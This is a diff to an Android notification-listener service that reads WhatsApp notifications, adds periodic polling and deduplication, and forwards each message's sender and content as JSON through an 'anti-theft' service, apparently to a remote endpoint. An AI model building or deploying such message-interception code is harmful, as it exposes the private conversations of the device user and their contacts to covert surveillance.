@@ -19,13 +19,53 @@ class WhatsAppNotificationListener : NotificationListenerService() {
 
     private val handler = Handler(Looper.getMainLooper())
     private val scannedTimestamps = mutableSetOf<Long>()
+    private val polledNotificationKeys = mutableSetOf<String>()
+    private var lastPollTime = 0L
+
+    private val sentPrefs by lazy {
+        getSharedPreferences("wa_sent_msgs", Context.MODE_PRIVATE)
+    }
 
     override fun onListenerConnected() {
         Log.d("WhatsAppListener", "NotificationListener CONNECTED — ready to receive notifications")
+        instance = this
+        startPolling()
     }
 
     override fun onListenerDisconnected() {
         Log.w("WhatsAppListener", "NotificationListener DISCONNECTED")
+        instance = null
+    }
+
+    /**
+     * Periodically polls getActiveNotifications() as a fallback for Xiaomi/MIUI
+     * where onNotificationPosted() may not be reliably called.
+     */
+    private fun startPolling() {
+        handler.post(object : Runnable {
+            override fun run() {
+                try {
+                    val now = System.currentTimeMillis()
+                    if (now - lastPollTime < 10_000) {
+                        handler.postDelayed(this, 15_000)
+                        return
+                    }
+                    lastPollTime = now
+                    for (sbn in activeNotifications) {
+                        if (!WHATSAPP_PACKAGES.contains(sbn.packageName)) continue
+                        val key = "${sbn.packageName}:${sbn.id}:${sbn.postTime}"
+                        if (polledNotificationKeys.contains(key)) continue
+                        polledNotificationKeys.add(key)
+                        if (polledNotificationKeys.size > 200) polledNotificationKeys.clear()
+                        Log.d("WhatsAppListener", "Poll found new notification: pkg=${sbn.packageName} id=${sbn.id}")
+                        onNotificationPosted(sbn)
+                    }
+                } catch (e: Exception) {
+                    Log.w("WhatsAppListener", "Poll failed: ${e.message}")
+                }
+                handler.postDelayed(this, 15_000)
+            }
+        })
     }
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
@@ -125,12 +165,21 @@ class WhatsAppNotificationListener : NotificationListenerService() {
         if (rawText.isBlank()) return result
         if (isStatusText(rawText)) return result
 
-        val title = normalizeChatName(cleanTitle(rawTitle))
+        val title = cleanTitle(rawTitle)
         val text = cleanSummaryPrefix(rawText)
 
+        // Try to extract group sender from text like "Sender: message"
         val (sender, body) = parseGroupSender(text)
-        val chatName = title.ifBlank { normalizeChatName(sender) }
-        if (chatName.isBlank() || isGenericName(chatName)) return result
+        val isGroup = title.isNotBlank() && sender.isNotBlank() && sender != title
+
+        val chatName = when {
+            // Title is the chat name (works for both direct and group chats)
+            title.isNotBlank() -> title
+            // Fallback to sender if no title
+            sender.isNotBlank() -> sender
+            else -> return result
+        }
+        if (isGenericName(chatName)) return result
 
         result.add(WhatsMessage(
             address = chatName,
@@ -199,15 +248,45 @@ class WhatsAppNotificationListener : NotificationListenerService() {
                 Log.w("WhatsAppListener", "Skipping message: blank chat name for content='${msg.content.take(40)}'")
                 return
             }
+            // Persistent dedup: skip if same chat+content was already forwarded recently.
+            // Survives service restarts (unlike in-memory sets).
+            val dedupKey = "$cleanName|${msg.content}"
+            val now = System.currentTimeMillis()
+            val lastSent = sentPrefs.getLong(dedupKey, 0L)
+            if (lastSent > 0 && now - lastSent < DEDUP_WINDOW_MS) {
+                Log.d("WhatsAppListener", "Dedup: already sent '${msg.content.take(40)}' to $cleanName, skipping")
+                return
+            }
             val address = Json.encodeToString(String.serializer(), cleanName)
             val name = Json.encodeToString(String.serializer(), cleanName)
             val content = Json.encodeToString(String.serializer(), msg.content)
             val payload = """{"type":"WHATSAPP_MESSAGE","direction":"in","address":$address,"name":$name,"content":$content,"timestamp":${msg.timestamp}}"""
             val sent = AntiTheftService.sendRawMessage(payload)
+            if (sent) {
+                sentPrefs.edit().putLong(dedupKey, now).apply()
+                pruneSentPrefs()
+            }
             Log.d("WhatsAppListener", "forwarded message to $cleanName sent=$sent content='${msg.content.take(40)}'")
         } catch (e: Exception) {
             Log.e("WhatsAppListener", "Failed to forward message: ${e.message}")
         }
+    }
+
+    /** Keeps the dedup store small by removing entries older than the window. */
+    private fun pruneSentPrefs() {
+        val all = sentPrefs.all
+        if (all.size < 300) return
+        val cutoff = System.currentTimeMillis() - DEDUP_WINDOW_MS
+        val editor = sentPrefs.edit()
+        var removed = 0
+        for ((key, value) in all) {
+            if (value is Long && value < cutoff) {
+                editor.remove(key)
+                removed++
+            }
+        }
+        editor.apply()
+        if (removed > 0) Log.d("WhatsAppListener", "Dedup pruned $removed old entries")
     }
 
     private fun detectMediaType(content: String): String? {
@@ -292,12 +371,10 @@ class WhatsAppNotificationListener : NotificationListenerService() {
         // Strip leading emojis and special chars
         clean = clean.replace(Regex("^[\\p{So}\\p{Cn}]+"), "")
 
-        // Remove suffixes like "(6 mensagens)", "(2 mensagens novas)", ": 3 mensagens"
+        // Remove suffixes like "(6 mensagens)", "(2 mensagens novas)"
         clean = clean.replace(Regex("\\s*[(\\[]\\d+\\s+mensagens?\\s*(novas?)?[)\\]].*$", RegexOption.IGNORE_CASE), "")
-        clean = clean.replace(Regex("\\s*:\\s*\\d+\\s+mensagens?.*$", RegexOption.IGNORE_CASE), "")
 
-        // Remove trailing colon fragments (e.g. ": suporte24h")
-        // Only remove if it looks like a message count suffix, not a group sender name
+        // Remove ": 3 mensagens" suffix
         clean = clean.replace(Regex("\\s*:\\s*\\d+\\s+mensagens?.*$", RegexOption.IGNORE_CASE), "")
 
         return clean.trim()
@@ -312,7 +389,14 @@ class WhatsAppNotificationListener : NotificationListenerService() {
 
     companion object {
         private val WHATSAPP_PACKAGES = setOf("com.whatsapp", "com.whatsapp.w4b")
+        /**
+         * How long a forwarded chat+content pair is remembered to prevent duplicates.
+         * 30 min covers service-restart storms (re-polling old notifications) while
+         * still allowing legitimately repeated identical texts later on.
+         */
+        private const val DEDUP_WINDOW_MS = 30 * 60 * 1000L // 30 minutes
         @Volatile private var lastAddress: String = ""
+        @Volatile private var instance: WhatsAppNotificationListener? = null
 
         fun lastIncomingAddress(): String = lastAddress
 
@@ -323,5 +407,8 @@ class WhatsAppNotificationListener : NotificationListenerService() {
             ) ?: return false
             return flat.contains("${context.packageName}/${WhatsAppNotificationListener::class.java.name}")
         }
+
+        /** Returns true if listener is currently bound and actively receiving. */
+        fun isConnected(): Boolean = instance != null
     }
 }
